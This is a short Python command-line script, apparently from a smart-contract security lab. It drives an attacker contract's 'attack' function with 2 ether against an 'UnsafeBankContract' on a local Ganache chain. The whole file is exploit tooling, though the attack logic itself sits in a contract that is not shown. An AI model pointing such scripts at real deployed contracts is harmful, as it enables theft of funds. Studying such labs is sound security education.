from web3 import Web3
import random
import click

abi = [
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": True
    }
]

def get_web3(url):
    return Web3(Web3.HTTPProvider(url))

def exploit(contract_address, url):
    web3 = get_web3(url)
    contract = web3.eth.contract(address=contract_address, abi=abi)
    account = web3.eth.accounts[0]

  
    value = web3.toWei(2, "ether")

    tx_hash = contract.functions.attack().transact({
        "from": account,
        "value": value
    })
    
    try:
        web3.eth.call(tx_hash)
    except Exception as e: 
        print(e)
    
    print("The exploit was executed")


@click.command()
@click.option('--contract-address', prompt='Write the contract address', help='Contract address to populate')
@click.option('--url', prompt=False, help='Url of the blockchain', default="http://localhost:7545")
def exploit_contract(contract_address, url):
    """Script to exploit the contract 'UnsafeBankContract' with a large amount of Ether"""
    exploit(contract_address, url)

if __name__ == '__main__':
    exploit_contract()